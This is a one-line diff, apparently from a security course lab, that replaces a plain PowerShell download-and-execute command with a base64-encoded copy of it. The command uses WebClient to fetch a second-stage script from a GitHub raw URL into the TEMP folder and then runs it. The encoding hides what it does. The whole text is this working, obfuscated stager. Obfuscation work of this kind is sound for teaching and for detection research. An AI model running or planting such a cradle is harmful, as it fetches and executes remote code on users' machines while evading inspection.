@@ -1,1 +1,1 @@
-"& { (New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/kwafula/kwafula.github.io/refs/heads/main/CSC846-Lab08/stage2Obfv1', '$env:TEMP\stage2Obfv1.ps1'); & '$env:TEMP\stage2Obfv1.ps1' }"
+IiYgeyAoTmV3LU9iamVjdCBTeXN0ZW0uTmV0LldlYkNsaWVudCkuRG93bmxvYWRGaWxlKCdodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20va3dhZnVsYS9rd2FmdWxhLmdpdGh1Yi5pby9yZWZzL2hlYWRzL21haW4vQ1NDODQ2LUxhYjA4L3N0YWdlMk9iZnYxJywgJyRlbnY6VEVNUFxzdGFnZTJPYmZ2MS5wczEnKTsgJiAnJGVudjpURU1QXHN0YWdlMk9iZnYxLnBzMScgfSI=
